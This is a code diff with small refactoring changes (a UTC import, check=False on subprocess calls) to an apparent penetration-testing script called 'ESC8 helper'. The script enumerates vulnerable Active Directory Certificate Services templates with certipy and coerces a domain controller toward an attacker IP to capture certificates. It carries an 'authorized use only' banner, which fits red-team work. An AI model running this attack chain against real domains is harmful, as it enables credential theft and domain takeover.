@@ -22,7 +22,7 @@ import subprocess
 import sys
 import threading
 import time
-from datetime import datetime, timezone
+from datetime import datetime, timezone, UTC
 
 CERT_MARKER = "Base64 certificate of user"
 B64_RE = re.compile(r"^[A-Za-z0-9+/=]{40,}$")
@@ -42,7 +42,7 @@ def run_certipy_find(certipy, user, password, dc_ip, timeout):
            "-vulnerable", "-enabled", "-stdout"]
     print(f"[*] enumerating AD CS: {' '.join(cmd[:2])} ... -vulnerable")
     try:
-        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=False)
     except subprocess.TimeoutExpired:
         print("[!] certipy find timed out", file=sys.stderr)
         return False, ""
@@ -110,7 +110,7 @@ def trigger_coercion(method, attacker_ip, dc_ip, user, password, domain, timeout
         return
     print(f"[*] coercing DC {dc_ip} via {method}")
     try:
-        subprocess.run(cmd, timeout=timeout)
+        subprocess.run(cmd, timeout=timeout, check=False)
     except subprocess.TimeoutExpired:
         print("[*] coercion command finished/timed out (expected)")
 
@@ -148,7 +148,7 @@ def main():
     parser.add_argument("--timeout", type=int, default=120, help="Per-step timeout")
     args = parser.parse_args()
 
-    print(f"[*] ESC8 helper — {datetime.now(timezone.utc).isoformat()}")
+    print(f"[*] ESC8 helper — {datetime.now(UTC).isoformat()}")
     print("[!] Authorized use only. Confirm rules-of-engagement.\n")
 
     if not args.skip_enum:
